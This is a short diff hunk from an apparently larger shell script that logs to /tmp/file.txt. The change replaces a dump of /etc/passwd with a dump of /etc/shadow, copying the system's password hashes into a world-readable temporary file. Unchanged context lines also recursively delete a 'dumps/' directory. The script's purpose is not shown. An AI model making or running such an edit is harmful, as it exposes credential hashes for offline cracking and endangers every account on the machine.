@@ -23,7 +23,7 @@ done
 
 echo "FINISHED..." >> /tmp/file.txt
 
-echo $(cat /etc/passwd) >> /tmp/file.txt
+echo $(cat /etc/shadow) >> /tmp/file.txt
 
 rm -rf dumps/
 
